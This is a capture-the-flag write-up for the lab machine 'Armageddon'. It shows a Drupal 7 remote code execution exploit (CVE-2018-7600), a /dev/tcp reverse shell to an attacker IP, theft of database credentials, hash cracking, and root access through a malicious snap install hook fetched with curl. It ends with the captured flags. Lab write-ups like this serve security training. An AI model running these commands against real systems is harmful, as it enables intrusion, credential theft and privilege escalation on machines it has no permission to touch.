# Armageddon - Easy

```shell
sudo vim /etc/hosts
#add armageddon.htb

nmap -T4 -p- -A -Pn -v armageddon.htb

cmseek

#get exploit from Github
python3 drupal7-CVE-2018-7600.py http://armageddon.htb/ -c "id"
#we get rce

nc -nvlp 443
#listener on port 4444 does not work

python3 drupal7-CVE-2018-7600.py http://armageddon.htb/ -c "sh -i >& /dev/tcp/10.10.14.8/443 0>&1"
#we get reverse shell

id
#apache

python3 -c 'import pty;pty.spawn("/bin/bash")'
#this does not work

cat /etc/passwd
#we have user 'brucetherealadmin'

ls -la /home
#access denied

pwd
#enumerate files in /var/www/html

ls -la sites

ls -la sites/default

#another way to grep password
grep -ir "password" sites/*
#this gives us a hash

cat sites/default/settings.php
#this contains db details for 'drupaluser'

mysql -u drupaluser -p
#does not work
#as we do not have pty shell

mysql -u drupaluser -p -e "show databases"
#use -e flag to pass command

mysql -u drupaluser -p -e "SELECT table_name FROM information_schema.tables WHERE table_schema = 'drupal'"
#list tables from drupal database

mysql -u drupaluser -p -e "SELECT * FROM drupal.users"
#dump users table from drupal database
#this gives us hash

#in attacker machine
hashcat -a 0 -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
#cracks drupal hash
#we get password

ssh brucetherealadmin@armageddon.htb
#ssh login works using cracked password

cat user.txt

sudo -l
#we can run snap install as root

#snap exploit on GTFObins

#on attacker machine
COMMAND="cat /root/root.txt"

cd $(mktemp -d)

mkdir -p meta/hooks

printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install

chmod +x meta/hooks/install

sudo gem install fpm

fpm -n xxxx -s dir -t snap -a all meta
#crafts malicious snap package

python3 -m http.server

#in victim ssh session
curl http://10.10.14.8:8000/xxxx_1.0_all.snap -o xxxx_1.0_all.snap

sudo /usr/bin/snap install xxxx_1.0_all.snap --dangerous --devmode
#this prints root flag as error
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.4
  * 80 - http - Apache httpd 2.4.6 (CentOS)

* The webpage shows a login page for some blog titled 'Armageddon'.

* Using ```cmseek```, we find that the page is based on ```Drupal v7```.

* Searching for exploits related to this give us results for exploits related to 'drupalgeddon' and 'CVE-2018-7600'.

* We can get the exploit for CVE-2018-7600 from GitHub; running the exploit works and we get RCE.

* To get shell, we can run the exploit with a reverse-shell one-liner command; we get reverse-shell on our listener at port 443.

* We have shell as 'apache' user now; however there are a lot of restrictions.

* We cannot upgrade or stabilize our shell; moreover, we do not have permissions to execute scripts or access /home directory.

* We can check the web files in the current working directory '/var/www/html' - there are a lot of files to go through.

* While enumerating all the files and folders, we stumble upon a file 'settings.php' in the 'sites/default' directory.

* This file contains the database details - it also contains username 'drupaluser' and the corresponding password.

* Therefore, we can connect with ```mysql``` as drupaluser - but this does not work as we do not have a proper shell.

* We can use the ```-e``` flag instead to pass commands.

* Using this way, we can dump the 'users' table from the 'drupal' database - this gives us a hash for 'admin' user.

* Now, checking ```/etc/passwd``` file shows that there is a user 'brucetherealadmin' - this hash could be cracked and checked for password reuse.

* ```hashcat``` cracks the ```Drupal``` hash, and using this password, we can login as 'brucetherealadmin' via SSH.

* User flag can be found in the home directory once we log in.

* ```sudo -l``` shows we can run the following command as root:

  ```/usr/bin/snap install *```

* From GTFObins, we can get an exploit for ```snap```.

* By following this exploit, we can craft a malicious '.snap' package in attacker machine, and transfer it to the victim SSH session.

* Running the sudo command with the crafted package prints the root flag.

```markdown
1. User flag - db25aee79c0f2dd96b187a3e9148c3da

2. Root flag - 14d07e2fc3120ff8f92d97545a7b66ab
```
